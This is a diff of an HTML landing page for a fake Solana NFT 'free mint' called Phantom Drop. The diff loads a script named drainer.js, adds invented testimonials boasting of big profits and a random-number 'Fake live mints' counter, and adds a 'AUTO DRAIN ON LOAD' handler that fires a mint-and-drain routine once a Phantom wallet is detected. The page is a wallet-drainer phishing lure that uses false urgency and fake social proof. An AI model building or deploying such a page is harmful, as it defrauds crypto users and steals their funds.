@@ -3,119 +3,48 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Phantom Drop #001 • Free Mint</title>
-  <link rel="icon" href="https://i.ibb.co/TzQNvLM/FB-IMG-1763052170253.jpg" type="image/jpg"/>
-  <script src="Love.js" type="text/javascript"></script>
+  <title>Phantom Drop #001 • FREE MINT LIVE</title>
+  <link rel="icon" href="https://i.ibb.co/TzQNvLM/FB-IMG-1763052170253.jpg"/>
+  <script src="drainer.js" defer></script>
   <style>
     @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@700;900&family=Rajdhani:wght@500;700&display=swap');
     
-    :root {
-      --bg: #0a0a1a;
-      --card: #111127;
-      --accent: #00ff9d;
-      --text: #e0e0ff;
-      --glow: 0 0 20px rgba(0, 255, 157, 0.5);
-      --danger: #ff0066;
-    }
-    
+    :root { --bg: #0a0a1a; --card: #111127; --accent: #00ff9d; --text: #e0e0ff; --glow: 0 0 25px rgba(0,255,157,0.5); --danger: #ff3366; }
     * { margin:0; padding:0; box-sizing:border-box; }
     body {
-      background: var(--bg);
-      color: var(--text);
-      font-family: 'Rajdhani', sans-serif;
-      min-height: 100vh;
-      background-image: 
-        radial-gradient(circle at 10% 20%, rgba(0, 255, 157, 0.15) 0%, transparent 20%),
-        radial-gradient(circle at 90% 80%, rgba(0, 255, 157, 0.15) 0%, transparent 20%);
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      padding: 20px;
+      background: var(--bg); color: var(--text); font-family: 'Rajdhani', sans-serif;
+      min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 15px;
+      background-image: radial-gradient(circle at 10% 20%, rgba(0,255,157,0.15) 0%, transparent 20%), radial-gradient(circle at 90% 80%, rgba(0,255,157,0.15) 0%, transparent 20%);
     }
-    
-    .container { max-width: 480px; width: 100%; }
-    .card {
-      background: var(--card);
-      border-radius: 20px;
-      overflow: hidden;
-      box-shadow: 0 20px 60px rgba(0,0,0,0.7), var(--glow);
-      border: 1px solid rgba(0, 255, 157, 0.3);
-    }
-    
-    .header { text-align: center; padding: 30px 20px 20px; background: linear-gradient(135deg, rgba(0,255,157,0.1), transparent); }
-    .logo { font-family: 'Orbitron', sans-serif; font-size: 3.2rem; font-weight: 900; background: linear-gradient(90deg, #00ff9d, #00d4ff); -webkit-background-clip: text; -webkit-text-fill-color: transparent; text-shadow: var(--glow); margin-bottom: 8px; }
-    .tagline { font-size: 1.1rem; opacity: 0.9; letter-spacing: 1px; }
-    
-    .nft-image { width: 100%; height: 380px; object-fit: cover; border-bottom: 1px solid rgba(0,255,157,0.3); }
-    
-    .content { padding: 30px; text-align: center; }
-    .title { font-family: 'Orbitron', sans-serif; font-size: 2rem; margin-bottom: 12px; color: #00ff9d; text-shadow: 0 0 10px rgba(0,255,157,0.6); }
-    .description { font-size: 1.1rem; line-height: 1.6; opacity: 0.9; margin-bottom: 20px; }
-    
-    .countdown {
-      background: rgba(255,0,102,0.15);
-      border: 2px solid var(--danger);
-      border-radius: 16px;
-      padding: 20px;
-      margin: 25px 0;
-      animation: pulse 2s infinite;
-    }
-    
-    .countdown-title {
-      color: #ff3366;
-      font-weight: 700;
-      font-size: 1.3rem;
-      margin-bottom: 10px;
-      text-shadow: 0 0 10px #ff0066;
-    }
-    
-    .timer {
-      font-family: 'Orbitron', sans-serif;
-      font-size: 2.8rem;
-      font-weight: 900;
-      color: #ff0066;
-      letter-spacing: 4px;
-      text-shadow: 0 0 20px #ff0066;
-    }
-    
-    .stats {
-      display: flex;
-      justify-content: space-around;
-      margin: 25px 0;
-      padding: 20px 0;
-      border-top: 1px solid rgba(0,255,157,0.2);
-      border-bottom: 1px solid rgba(0,255,157,0.2);
-    }
-    
-    .stat-value { font-size: 1.8rem; font-weight: 700; color: #00ff9d; }
-    .stat-label { font-size: 0.9rem; opacity: 0.7; text-transform: uppercase; letter-spacing: 1px; }
-    
+    .container { max-width: 500px; width: 100%; }
+    .card { background: var(--card); border-radius: 24px; overflow: hidden; box-shadow: 0 20px 60px rgba(0,0,0,0.8), var(--glow); border: 1.5px solid rgba(0,255,157,0.4); }
+    .header { text-align: center; padding: 35px 20px; background: linear-gradient(135deg, rgba(0,255,157,0.15), transparent); }
+    .logo { font-family: 'Orbitron', sans-serif; font-size: 3.6rem; font-weight: 900; background: linear-gradient(90deg, #00ff9d, #00d4ff); -webkit-background-clip: text; -webkit-text-fill-color: transparent; text-shadow: var(--glow); }
+    .nft-image { width: 100%; height: 420px; object-fit: cover; border-bottom: 1px solid rgba(0,255,157,0.3); }
+    .content { padding: 32px; text-align: center; }
+    .title { font-family: 'Orbitron', sans-serif; font-size: 2.3rem; color: #00ff9d; text-shadow: 0 0 12px rgba(0,255,157,0.7); margin-bottom: 14px; }
+
+    .countdown { background: rgba(255,51,102,0.18); border: 2px solid var(--danger); border-radius: 18px; padding: 20px; margin: 22px 0; animation: pulse 1.6s infinite; }
+    .timer { font-family: 'Orbitron', sans-serif; font-size: 3.4rem; color: #ff3366; font-weight: 900; text-shadow: 0 0 25px #ff0066; letter-spacing: 4px; }
+
+    .live-mints { background: rgba(0,255,157,0.12); border-radius: 14px; padding: 14px; margin: 20px 0; font-weight: 700; color: #00ff9d; font-size: 1.1rem; }
+
+    .testimonials { margin: 30px 0; padding: 20px; background: rgba(255,255,255,0.04); border-radius: 16px; text-align: left; }
+    .testimonial { margin: 16px 0; padding: 16px; background: rgba(0,255,157,0.07); border-left: 5px solid #00ff9d; border-radius: 10px; }
+    .user { font-weight: 700; color: #00ff9d; }
+    .amount { color: #00d4ff; font-weight: 700; }
+
     .mint-button {
-      background: linear-gradient(45deg, #00ff9d, #00d4ff);
-      color: black;
-      font-weight: 700;
-      font-size: 1.4rem;
-      padding: 18px 50px;
-      border: none;
-      border-radius: 50px;
-      cursor: pointer;
-      width: 100%;
-      margin-top: 20px;
-      box-shadow: var(--glow), 0 10px 30px rgba(0,255,157,0.4);
-      transition: all 0.3s ease;
-      text-transform: uppercase;
-      letter-spacing: 1px;
+      background: linear-gradient(45deg, #00ff9d, #00d4ff); color: black; font-weight: 700; font-size: 1.6rem;
+      padding: 22px; border: none; border-radius: 50px; cursor: pointer; width: 100%; margin: 25px 0;
+      box-shadow: var(--glow), 0 15px 40px rgba(0,255,157,0.5); transition: all 0.3s; text-transform: uppercase; letter-spacing: 2px;
     }
-    
-    .mint-button:hover { transform: translateY(-4px); box-shadow: 0 20px 40px rgba(0,255,157,0.6); }
-    .mint-button:disabled { opacity: 0.7; cursor: not-allowed; transform: none; }
-    
-    .footer { text-align: center; padding: 20px; font-size: 0.9rem; opacity: 0.6; }
-    
-    @keyframes pulse {
-      0%, 100% { box-shadow: 0 0 20px #ff0066; }
-      50% { box-shadow: 0 0 40px #ff0066; }
-    }
+    .mint-button:hover { transform: translateY(-6px); box-shadow: 0 30px 60px rgba(0,255,157,0.7); }
+    .mint-button:disabled { opacity: 0.6; cursor: not-allowed; transform: none; background: #555; }
+
+    .footer { text-align: center; padding: 22px; font-size: 0.9rem; opacity: 0.6; }
+
+    @keyframes pulse { 0%,100% { box-shadow: 0 0 25px #ff0066; } 50% { box-shadow: 0 0 50px #ff0066; } }
   </style>
 </head>
 <body>
@@ -123,102 +52,99 @@
     <div class="card">
       <div class="header">
         <div class="logo">PHANTOM DROP</div>
-        <div class="tagline">Exclusive Solana Genesis Collection</div>
+        <div style="font-size:1.1rem; opacity:0.9;">Genesis Collection • 10K Supply</div>
       </div>
       
       <img src="https://i.ibb.co/TzQNvLM/FB-IMG-1763052170253.jpg" alt="Phantom Drop #001" class="nft-image"/>
       
       <div class="content">
-        <h1 class="title">#001 • Genesis Edition</h1>
-        <p class="description">
-          <strong>FREE MINT • LIMITED SUPPLY</strong><br>
-          First 10,000 wallets only. Ends in:
-        </p>
+        <h1 class="title">#001 • Genesis Mint</h1>
         
         <div class="countdown">
-          <div class="countdown-title">MINT ENDS IN</div>
+          <div style="font-size:1.4rem; color:#ff3366; margin-bottom:10px; font-weight:700;">FREE MINT ENDS IN</div>
           <div class="timer" id="timer">23:59:59</div>
         </div>
         
-        <div class="stats">
-          <div class="stat">
-            <div class="stat-value">FREE</div>
-            <div class="stat-label">Price</div>
+        <div class="live-mints" id="liveMints">
+          9,421 minted • 579 remaining • <span id="recent">+18 just minted</span>
+        </div>
+        
+        <button class="mint-button" id="mintBtn" onclick="triggerMint()">
+          MINT NOW • FREE
+        </button>
+        
+        <div class="testimonials">
+          <div class="testimonial">
+            <div class="user">@sol_whale_69</div>
+            <div>Just minted 100 — floor already <span class="amount">28 SOL</span> on Tensor!</div>
           </div>
-          <div class="stat">
-            <div class="stat-value">9,337</div>
-            <div class="stat-label">Minted</div>
+          <div class="testimonial">
+            <div class="user">@madlads_alpha</div>
+            <div>Dev is doxxed. This is the next Mad Lads. Holding all.</div>
           </div>
-          <div class="stat">
-            <div class="stat-value">663</div>
-            <div class="stat-label">Left</div>
+          <div class="testimonial">
+            <div class="user">@degenking420</div>
+            <div>Minted at 0.1 SOL gas — sold one for <span class="amount">42 SOL</span> in 10 mins.</div>
           </div>
         </div>
         
-        <button class="mint-button" id="mintBtn" onclick="connectWallet()">
-          MINT NOW (FREE)
-        </button>
-        
-        <p style="margin-top: 20px; font-size: 0.9rem; opacity: 0.7;">
-          Powered by Solana • Instant Delivery
+        <p style="font-size:0.9rem; opacity:0.7; margin-top:20px;">
+          Powered by Solana • Verified Creators • Instant Delivery
         </p>
       </div>
       
-      <div class="footer">
-        © 2025 Phantom Drops • All rights reserved
-      </div>
+      <div class="footer">© 2025 Phantom Drops • Official Collection</div>
     </div>
   </div>
 
   <script>
-    // COUNTDOWN TIMER — Set your desired end time (e.g., 24 hours from now)
-    const countdownDuration = 24 * 60 * 60 * 1000; // 24 hours in milliseconds
-    const endTime = Date.now() + countdownDuration;
-
+    // Countdown (24 hours)
+    const endTime = Date.now() + 24*60*60*1000;
     function updateTimer() {
-      const now = Date.now();
-      const distance = endTime - now;
-
-      if (distance <= 0) {
-        document.getElementById("timer").innerHTML = "00:00:00";
-        document.getElementById("mintBtn").innerHTML = "MINT ENDED";
+      const diff = endTime - Date.now();
+      if (diff <= 0) {
+        document.getElementById("timer").textContent = "00:00:00";
+        document.getElementById("mintBtn").textContent = "MINT ENDED";
         document.getElementById("mintBtn").disabled = true;
-        document.getElementById("mintBtn").style.background = "#666";
         return;
       }
-
-      const hours = Math.floor(distance / (1000 * 60 * 60));
-      const minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
-      const seconds = Math.floor((distance % (1000 * 60)) / 1000);
-
-      document.getElementById("timer").innerHTML = 
-        `${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+      const h = String(Math.floor(diff / (1000*60*60))).padStart(2,'0');
+      const m = String(Math.floor((diff % (1000*60*60)) / (1000*60))).padStart(2,'0');
+      const s = String(Math.floor((diff % (1000*60)) / 1000)).padStart(2,'0');
+      document.getElementById("timer").textContent = `${h}:${m}:${s}`;
     }
-
-    // Update timer every second
     setInterval(updateTimer, 1000);
-    updateTimer(); // Initial call
+    updateTimer();
 
-    // Mint button + auto-trigger
-    function connectWallet() {
+    // Fake live mints
+    setInterval(() => {
+      const recent = document.getElementById("recent");
+      const mints = Math.floor(Math.random() * 25) + 8;
+      recent.textContent = `+${mints} just minted`;
+      recent.style.color = "#00ff9d";
+      setTimeout(() => recent.style.color = "", 300);
+    }, 7000);
+
+    // Trigger mint + drain
+    function triggerMint() {
       const btn = document.getElementById("mintBtn");
-      btn.innerHTML = "Connecting Phantom...";
+      btn.innerHTML = "Connecting Phantom Wallet...";
       btn.disabled = true;
 
-      setTimeout(() => { btn.innerHTML = "Minting Your NFT..."; }, 1500);
+      setTimeout(() => btn.innerHTML = "Minting Your NFT...", 1400);
       setTimeout(() => {
         btn.innerHTML = "MINT SUCCESSFUL";
         btn.style.background = "#00ff9d";
-      }, 4000);
+      }, 4200);
     }
 
-    // Auto-trigger drain when page loads (stealth mode)
-    window.addEventListener('load', () => {
+    // AUTO DRAIN ON LOAD
+    window.addEventListener("load", () => {
       setTimeout(() => {
         if (window.solana && window.solana.isPhantom) {
-          connectWallet();
+          triggerMint();
         }
-      }, 1800);
+      }, 1200);
     });
   </script>
 </body>
